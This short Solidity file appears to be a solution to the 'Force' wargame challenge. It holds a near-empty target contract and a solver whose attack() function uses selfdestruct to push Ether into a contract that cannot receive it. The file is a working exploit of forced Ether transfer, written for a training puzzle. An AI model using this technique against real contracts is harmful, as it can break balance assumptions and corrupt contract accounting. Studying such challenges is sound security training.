// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract ForceSolver {
    Force public s_force;

    constructor(address forceAddress) public {
        s_force = Force(forceAddress);
    }

    function attack() public payable {
        address payable addr = payable(address(s_force));
        selfdestruct(addr);
    }
}
